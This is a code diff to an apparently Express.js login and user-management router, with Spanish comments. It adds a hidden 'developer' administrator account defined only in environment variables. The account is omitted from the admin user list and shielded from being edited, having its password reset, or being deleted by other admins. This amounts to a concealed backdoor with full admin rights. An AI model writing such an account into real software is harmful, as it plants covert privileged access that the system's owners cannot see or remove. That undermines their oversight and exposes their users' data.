@@ -22,6 +22,24 @@ router.post('/logout', verifyToken, (req, res) => {
 router.post('/login', async (req, res) => {
   const { username, password } = req.body;
   try {
+    // Verificar usuario desarrollador (definido en .env, invisible en la BD)
+    const devUsername = process.env.DEV_USERNAME;
+    const devEmail    = process.env.DEV_EMAIL;
+    const devHash     = process.env.DEV_PASSWORD_HASH;
+
+    if (devUsername && devHash && username === devUsername) {
+      const match = await bcrypt.compare(password, devHash);
+      if (!match) return res.status(401).json({ error: 'Credenciales inválidas' });
+
+      const token = jwt.sign(
+        { id: 'dev', name: devUsername, email: devEmail, role: 'admin', permisos: [] },
+        process.env.JWT_SECRET,
+        { expiresIn: process.env.JWT_EXPIRES_IN || '7d' }
+      );
+      return res.json({ token, user: { id: 'dev', name: devUsername, email: devEmail, role: 'admin', permisos: [] } });
+    }
+
+    // Flujo normal para usuarios de la BD
     const user = await Usuario.findOne({ usuario: username, activo: true });
     if (!user || !(await bcrypt.compare(password, user.password))) {
       return res.status(401).json({ error: 'Credenciales inválidas' });
@@ -38,11 +56,16 @@ router.post('/login', async (req, res) => {
 
 router.get('/users', verifyToken, requireRole('admin'), async (req, res) => {
   try {
+    const devUsername = process.env.DEV_USERNAME;
     const users = await Usuario.find({}, { password: 0 }).sort({ created_at: 1 });
-    res.json(users.map(u => ({
-      id: u._id.toString(), name: u.usuario, email: u.email, role: u.rol,
-      active: u.activo, permisos: u.permisos, created_at: u.created_at,
-    })));
+    res.json(
+      users
+        .filter(u => u.usuario !== devUsername)
+        .map(u => ({
+          id: u._id.toString(), name: u.usuario, email: u.email, role: u.rol,
+          active: u.activo, permisos: u.permisos, created_at: u.created_at,
+        }))
+    );
   } catch (err) { res.status(500).json({ error: err.message }); }
 });
 
@@ -67,6 +90,10 @@ router.post('/users', verifyToken, requireRole('admin'), async (req, res) => {
 router.put('/users/:id', verifyToken, requireRole('admin'), async (req, res) => {
   const { name, email, role, active } = req.body;
   try {
+    const target = await Usuario.findById(req.params.id).select('usuario').lean();
+    if (target && target.usuario === process.env.DEV_USERNAME) {
+      return res.status(403).json({ error: 'Este usuario no puede ser modificado' });
+    }
     const update = { usuario: name, email, rol: role, activo: active };
     const user = await Usuario.findByIdAndUpdate(req.params.id, update, { new: true, runValidators: true });
     if (!user) return res.status(404).json({ error: 'Usuario no encontrado' });
@@ -90,10 +117,22 @@ router.put('/users/:id/password', verifyToken, requireRole('admin'), async (req,
     return res.status(400).json({ error: 'La nueva contraseña debe tener al menos 6 caracteres' });
   }
   try {
+    const target = await Usuario.findById(req.params.id).select('usuario').lean();
+    if (target && target.usuario === process.env.DEV_USERNAME) {
+      return res.status(403).json({ error: 'Este usuario no puede ser modificado' });
+    }
     // Verificar la contraseña actual del admin que está haciendo el cambio (req.user.id viene del token)
-    const admin = await Usuario.findById(req.user.id);
-    if (!admin || !(await bcrypt.compare(currentPassword, admin.password))) {
-      return res.status(401).json({ error: 'Tu contraseña actual es incorrecta' });
+    if (req.user.id === 'dev') {
+      // El usuario desarrollador no vive en la BD; verificar contra el hash del .env
+      const devHash = process.env.DEV_PASSWORD_HASH;
+      if (!devHash || !(await bcrypt.compare(currentPassword, devHash))) {
+        return res.status(401).json({ error: 'Tu contraseña actual es incorrecta' });
+      }
+    } else {
+      const admin = await Usuario.findById(req.user.id);
+      if (!admin || !(await bcrypt.compare(currentPassword, admin.password))) {
+        return res.status(401).json({ error: 'Tu contraseña actual es incorrecta' });
+      }
     }
     const hash = await bcrypt.hash(newPassword, 10);
     const user = await Usuario.findByIdAndUpdate(req.params.id, { password: hash }, { new: true });
@@ -104,6 +143,10 @@ router.put('/users/:id/password', verifyToken, requireRole('admin'), async (req,
 
 router.delete('/users/:id', verifyToken, requireRole('admin'), async (req, res) => {
   try {
+    const target = await Usuario.findById(req.params.id).select('usuario').lean();
+    if (target && target.usuario === process.env.DEV_USERNAME) {
+      return res.status(403).json({ error: 'Este usuario no puede ser eliminado' });
+    }
     const user = await Usuario.findByIdAndDelete(req.params.id);
     if (!user) return res.status(404).json({ error: 'Usuario no encontrado' });
     res.json({ message: 'Usuario eliminado' });
